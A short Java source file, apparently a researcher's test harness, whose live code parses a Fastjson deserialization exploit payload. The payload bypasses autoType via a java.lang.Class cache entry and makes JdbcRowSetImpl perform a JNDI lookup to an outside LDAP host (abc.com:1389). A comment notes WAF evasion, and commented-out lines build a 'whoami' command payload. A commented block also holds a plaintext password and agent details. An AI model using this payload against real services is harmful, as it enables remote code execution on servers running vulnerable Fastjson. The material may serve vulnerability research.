package com.sorry.bug;

import com.alibaba.fastjson.JSON;

import com.fasterxml.jackson.core.JsonFactory;
import com.fasterxml.jackson.core.JsonGenerator;
import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;
import java.io.StringWriter;
import java.util.HashMap;
import java.util.Map;

/**
 * created by 0x22cb7139 on 2021/6/28
 */
public class Debug {
    public static void main(String[] args) throws IOException {
        //Execute execute = new Execute();
        //execute.setCommand("whoami");
        //String JsonStr = JSON.toJSONString(execute, SerializerFeature.WriteClassName);
        //System.out.println(JsonStr);
        //String expStr = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sorry.bug.Execute\"},\"b\":{\"@type\":\"com.sorry.bug.Execute\",\"command\":\"whoami\"}}";
        //绕过autotypesupport限制,unicode16绕waf.
        String expStr = "{\"e\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"f\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://abc.com:1389/NoEcho\",\"autoCommit\":true}}";
        JSON.parseObject(expStr);
        /*
        String agentId = "41797";
        String password = "1qaz!QAZ";
        String phoneNum = "89100141";
        boolean isAutoAnswer = true;
        boolean autoenteridle = true;
        Map<String, Object> entityParam = new HashMap<>();
        entityParam.put("password", password);
        entityParam.put("phonenum", phoneNum);
        entityParam.put("autoanswer", Boolean.valueOf(isAutoAnswer));
        entityParam.put("autoenteridle", Boolean.valueOf(autoenteridle));
        entityParam.put("status", Integer.valueOf(4));
        String jsonString = beanToJson(entityParam);
        System.out.println(jsonString);

         */



    }

    public static String beanToJson(Object object) throws IOException {
        ObjectMapper mapper = new ObjectMapper();
        StringWriter writer = new StringWriter();
        JsonGenerator gen = (new JsonFactory()).createJsonGenerator(writer);
        mapper.writeValue(gen, object);
        gen.close();
        String json = writer.toString();
        writer.close();
        return json;
    }
}
